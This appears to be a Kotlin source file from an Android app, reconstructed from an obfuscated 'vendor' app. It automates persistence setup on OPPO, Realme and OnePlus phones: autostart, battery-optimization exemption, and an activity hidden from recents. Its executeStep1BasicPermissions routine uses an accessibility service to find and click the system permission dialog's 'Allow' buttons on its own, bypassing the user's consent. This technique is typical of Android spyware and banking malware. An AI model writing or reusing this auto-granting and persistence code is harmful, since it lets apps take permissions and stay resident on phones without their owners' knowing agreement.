package com.storm.safe.rock.service.modules.yw5xud

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.delay

/**
 * OppoSteps — OPPO/Realme/OnePlus (ColorOS/RealmeUI/OxygenOS) keepalive automation.
 * Matches vendor C0370a7 (a7, OppoStepsSimplified). Key flows:
 *
 * 1. Auto-start management (自启动管理)
 *    - Navigate to: com.coloros.safecenter/.startupapp.StartupAppListActivity
 *    - Find app, enable auto-start switch (Switch→R()+finish pattern)
 * 2. Battery optimization
 *    - Navigate to power management settings
 *    - Disable battery optimization for our app
 * 3. Background management (后台管理)
 *    - Prevent system from killing our app in background
 * 4. All files access (MANAGE_EXTERNAL_STORAGE)
 *    - API 30+ file access permission
 */
open class OppoSteps(
    private val service: MyAccessibilityService?,
    private val context: Context
) {
    companion object {
        private const val TAG = "OppoSteps"

        // ColorOS component names (with fallbacks for Realme/OnePlus)
        val AUTOSTART_COMPONENTS = listOf(
            ComponentName(
                "com.coloros.safecenter",
                "com.coloros.safecenter.startupapp.StartupAppListActivity"
            ),
            ComponentName(
                "com.oppo.safe",
                "com.oppo.safe.permission.startup.StartupAppListActivity"
            ),
            ComponentName(
                "com.coloros.safecenter",
                "com.coloros.safecenter.permission.startup.StartupAppListActivity"
            )
        )

        val BATTERY_COMPONENTS = listOf(
            ComponentName(
                "com.coloros.oppoguardelf",
                "com.coloros.powermanager.fuelgaue.PowerUsageModelActivity"
            ),
            ComponentName(
                "com.coloros.oppoguardelf",
                "com.coloros.powermanager.fuelgaue.PowerSaverModeActivity"
            ),
            ComponentName(
                "com.oplus.battery",
                "com.oplus.powermanager.fuelgaue.PowerUsageModelActivity"
            )
        )

        /**
         * Step 1 permission dialog allow-button resource-ids,按优先级 3 个(Android 12+ permissioncontroller)。
         * PERMISSION_ALLOW_IDS 是更宽泛的 8-id fallback 列表(含 packageinstaller 等老 Android 版本);
         * STEP1_ALLOW_IDS 是华为真机 25/26 validated 的最小稳定集。
         */
        val STEP1_ALLOW_IDS = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button"
        )

        /** Permission allow button IDs for ColorOS. */
        val PERMISSION_ALLOW_IDS = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.android.packageinstaller:id/permission_allow_button",
            "com.google.android.packageinstaller:id/permission_allow_button",
            "android:id/button1",
            "android:id/button2",
            "com.android.settings:id/action_button"
        )

        /** Keywords for auto-start toggle. */
        val AUTOSTART_KEYWORDS = listOf(
            "允许自启动", "自启动", "Allow auto-start", "Auto-start", "Autostart"
        )

        /** Keywords for battery no-restriction. */
        val BATTERY_KEYWORDS = listOf(
            "不优化", "无限制", "Don't optimize", "Unrestricted", "允许后台运行"
        )
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        logs.add("OppoSteps: 开始OPPO/ColorOS权限配置")

        executeAutoStart(successes, failures, logs)
        delay(500)
        executeBatteryOptimization(successes, failures, logs)

        logs.add("OppoSteps: OPPO/ColorOS权限配置完成")
    }

    fun executeAutoStart(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = launchComponentActivity(AUTOSTART_COMPONENTS)
            if (launched) {
                logs.add("已启动ColorOS自启动管理")
                successes.add("OPPO自启动管理已打开")
            } else {
                failures.add("无法启动OPPO自启动管理")
            }
        } catch (e: Exception) {
            failures.add("OPPO自启动配置异常: ${e.message}")
        }
    }

    fun executeBatteryOptimization(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = launchComponentActivity(BATTERY_COMPONENTS)
            if (launched) {
                logs.add("已启动ColorOS电池管理")
                successes.add("OPPO电池优化已打开")
            } else {
                val intent = Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                ).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                logs.add("已发送电池优化豁免请求(标准)")
            }
        } catch (e: Exception) {
            failures.add("OPPO电池优化异常: ${e.message}")
        }
    }

    internal fun launchComponentActivity(components: List<ComponentName>): Boolean {
        for (component in components) {
            try {
                val intent = Intent().apply {
                    this.component = component
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                return true
            } catch (_: Exception) {
                continue
            }
        }
        return false
    }

    /**
     * Step 1 — 基础运行时权限(umrkmgrri 子模块 + resource-id 驱动)。
     *
     * vendor `OppoStepsSimplified.m212323c1` 委托 umrkmgrri.f55158a3.start(context) + 独立 Thread 轮询 20×500ms。
     * replica 采用与 HuaweiSteps.executeStep1BasicPermissions 一致的 resource-id 驱动:
     *  1. 启动 umrkmgrri Activity(等同于华为的 HuaweiPermissionRequestActivity)
     *  2. 10s 轮询主循环:优先 permissioncontroller resource-id 点击,失败降级 text 点击
     *
     * ADAPT: 不用 vendor 的坐标 fallback(华为 FIN-AL60 真机证明 coord 必然 miss)。
     */
    open suspend fun executeStep1BasicPermissions(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val svc = service ?: run {
            failures.add("[Step 1/10] service=null,跳过")
            return
        }
        Log.i(TAG, "[Step1/9] enter executeStep1BasicPermissions")
        logs.add("[Step 1/9] ▶ 基础权限开始(超时10秒) | vendor m212323c1")

        // 启动批量权限 Activity(复用现有 umrkmgrri)
        try {
            val intent = Intent(context, umrkmgrri::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                )
            }
            svc.startActivity(intent)
            logs.add("[Step 1/9] ✓ 已启动 umrkmgrri")
            delay(800L)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.w(TAG, "[Step1] launch umrkmgrri failed: ${e.message}")
        }

        val timeoutMs = 10_000L
        val start = System.currentTimeMillis()
        var clickCount = 0
        val maxClicksGuard = 40

        while (System.currentTimeMillis() - start < timeoutMs) {
            val root = try { svc.rootInActiveWindow } catch (_: Exception) { null }
            if (root == null) { delay(300L); continue }

            // 主路径:resource-id 驱动点击
            val clickedViaId = clickPermissionControllerAllowButton(root)
            if (clickedViaId != null) {
                Log.d(TAG, "[Step1] allow-by-id = $clickedViaId")
                logs.add("[Step 1/9] 🔍 allow-by-id = $clickedViaId")
                clickCount++
                delay(300L)
                if (clickCount >= maxClicksGuard) break
                continue
            }

            // fallback:文本点击
            val textClicked = clickTextOnRoot(root, "始终允许") ||
                clickTextOnRoot(root, "允许") ||
                clickTextOnRoot(root, "仅使用期间允许")
            if (textClicked) {
                clickCount++
                delay(300L)
            } else {
                delay(500L)
            }
            if (clickCount >= maxClicksGuard) break
        }

        val elapsedSec = (System.currentTimeMillis() - start) / 1000L
        logs.add("[Step 1/9] 完成,用时 ${elapsedSec}s,点击 $clickCount 次")
        if (clickCount > 0) successes.add("[Step 1/9] 基础权限处理 $clickCount 次")
    }

    /** 按 3 个 permissioncontroller resource-id 优先级查 + 点击,返回命中 id 短名或 null. */
    private fun clickPermissionControllerAllowButton(root: android.view.accessibility.AccessibilityNodeInfo): String? {
        for (id in STEP1_ALLOW_IDS) {
            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null } ?: continue
            for (n in nodes) {
                try { if (!n.isVisibleToUser) continue } catch (_: Exception) { /* mock may throw */ }
                if (performClickOrAncestor(n)) return id.substringAfterLast('/')
            }
        }
        return null
    }

    private fun performClickOrAncestor(node: android.view.accessibility.AccessibilityNodeInfo): Boolean {
        try {
            if (node.isClickable && node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) return true
            var p = try { node.parent } catch (_: Exception) { null }
            var depth = 0
            while (p != null && depth < 10) {
                if (p.isClickable && p.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) return true
                p = try { p.parent } catch (_: Exception) { null }
                depth++
            }
        } catch (_: Exception) { /* ignore */ }
        return false
    }

    private fun clickTextOnRoot(root: android.view.accessibility.AccessibilityNodeInfo, text: String): Boolean {
        val matches = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { return false } ?: return false
        for (n in matches) {
            try { if (!n.isVisibleToUser) continue } catch (_: Exception) {}
            val nodeText = try { n.text?.toString()?.trim() ?: "" } catch (_: Exception) { "" }
            if (nodeText == text && performClickOrAncestor(n)) return true
        }
        return false
    }
}
